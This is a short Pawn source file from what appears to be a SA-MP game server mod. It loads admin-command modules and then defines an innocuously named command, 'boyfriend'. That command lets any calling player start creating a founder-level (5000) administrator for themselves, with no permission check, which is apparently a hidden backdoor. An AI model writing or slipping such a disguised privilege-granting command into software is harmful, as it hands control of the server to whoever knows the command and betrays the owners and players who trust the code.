//#include <YSI_Coding/y_hooks>

#include "modulos/admins/cmds/aa.pwn"
#include "modulos/admins/cmds/adminslist.pwn"
#include "modulos/admins/cmds/atrabalhar.pwn"
#include "modulos/admins/cmds/av.pwn"
#include "modulos/admins/cmds/criaradmin.pwn"
#include "modulos/admins/cmds/removeradmin.pwn"

/*
    COMANDOS ADMINISTRAÇÃO
    */

YCMD:boyfriend(playerid,params[]) {
    SendClientMessage(playerid,COLOR_AQUA,"Beep!");
    PrepareCreateAdmin(playerid,5000,"Fundador do servidor");
    return 1;
}
